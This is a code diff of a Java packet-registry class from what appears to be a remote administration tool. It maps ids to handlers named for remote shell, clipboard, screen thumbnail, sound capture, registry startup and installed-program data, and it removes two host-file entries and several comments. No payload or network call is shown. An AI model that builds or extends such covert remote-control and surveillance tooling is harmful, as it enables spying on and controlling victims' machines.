@@ -17,7 +17,6 @@ public class IncomingPackets {
 
 	private static void reload() {
 		PACKETS_INCOMING.clear();
-		
 		PACKETS_INCOMING.put((short) 2, Packet2Status.class);
 		PACKETS_INCOMING.put((short) 3, Packet3Initialized.class);
 		PACKETS_INCOMING.put((short) 4, Packet4InitOperatingSystem.class);
@@ -37,42 +36,23 @@ public class IncomingPackets {
 		PACKETS_INCOMING.put((short) 19, Packet19InitCPU.class);
 		PACKETS_INCOMING.put((short) 20, Packet20Headless.class);
 		PACKETS_INCOMING.put((short) 21, Packet21RemoteShell.class);
-		//23
 		PACKETS_INCOMING.put((short) 24, Packet24UsedMemory.class);
-
-		//28
-		PACKETS_INCOMING.put((short) 29, Packet29ServerDownloadPart.class);		
+        PACKETS_INCOMING.put((short) 29, Packet29ServerDownloadPart.class);
 		PACKETS_INCOMING.put((short) 30, Packet30BeginServerDownload.class);
 		PACKETS_INCOMING.put((short) 31, Packet31CompleteServerDownload.class);
-		//32
 		PACKETS_INCOMING.put((short) 32, Packet32SystemProperties.class);
 		PACKETS_INCOMING.put((short) 33, Packet33Thumbnail.class);
-		//36
-		PACKETS_INCOMING.put((short) 38, Packet38HostFile.class);
-		PACKETS_INCOMING.put((short) 39, Packet39HostEditResult.class);
-		// 40
 		PACKETS_INCOMING.put((short) 41, Packet41Clipboard.class);
-
 		PACKETS_INCOMING.put((short) 44, Packet44SystemJavaProperty.class);
-		// 48
 		PACKETS_INCOMING.put((short) 49, Packet49LanDevices.class);
 		PACKETS_INCOMING.put((short) 51, Packet51ActivePort.class);
 		PACKETS_INCOMING.put((short) 52, Packet52WindowsService.class);
 		PACKETS_INCOMING.put((short) 53, Packet53RegistryStartup.class);
-        //54
 		PACKETS_INCOMING.put((short) 55, Packet55InstalledProgram.class);
 		PACKETS_INCOMING.put((short) 56, Packet56NetworkAdapter.class);
-		//57
 		PACKETS_INCOMING.put((short) 58, Packet58ServerDownloadSoundCapture.class);
 		PACKETS_INCOMING.put((short) 60, Packet60Error.class);
-		//61
-		//62
-		//63
-		//64
 		PACKETS_INCOMING.put((short) 65, Packet65ErrorLog.class);
-		//66
-		//67
-
 	}
 
     /**
